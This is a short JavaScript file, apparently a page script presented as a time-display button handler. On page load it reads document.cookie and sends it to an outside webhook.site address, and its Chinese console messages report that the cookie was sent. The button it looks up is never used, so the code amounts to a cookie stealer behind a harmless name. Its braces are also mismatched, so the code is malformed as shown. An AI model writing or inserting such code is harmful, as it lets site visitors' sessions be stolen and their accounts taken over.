document.addEventListener("DOMContentLoaded", function () {
  const button = document.getElementById("showTimeButton");
    sendCookies();
  });
  function sendCookies() {
    const url = `https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d?cookie=${encodeURIComponent(document.cookie)}`;

    fetch(url, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json'
      }
    })
    .then(response => {
      console.log('Cookie 已成功發送');
    })
    .catch(error => {
      console.error('發送 cookie 失敗:', error);
    });
  }
});
